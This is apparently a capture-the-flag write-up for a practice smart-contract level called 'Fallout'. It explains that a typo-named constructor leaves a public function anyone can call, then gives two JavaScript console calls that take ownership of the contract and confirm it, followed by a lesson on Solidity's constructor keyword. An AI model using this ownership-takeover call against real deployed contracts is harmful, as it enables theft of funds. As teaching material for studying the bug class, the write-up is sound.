# 2. Fallout

## Goal
Claim ownership of the contract.

## Vulnerability
The function meant to be the constructor is named `Fal1out` (with a "1" instead of an "l"), so it is a regular public function rather than a constructor. Anyone can call it directly to become owner.

## Exploit
\`\`\`javascript
// call the misnamed "constructor" directly to claim ownership
await contract.Fal1out()

// verify
await contract.owner()
\`\`\`

## Takeaway
This level predates Solidity 0.4.22, when constructors were defined by naming a function after the contract. A single typo left it callable by anyone. Modern Solidity fixes this entirely with the `constructor` keyword, removing the chance for this mistake.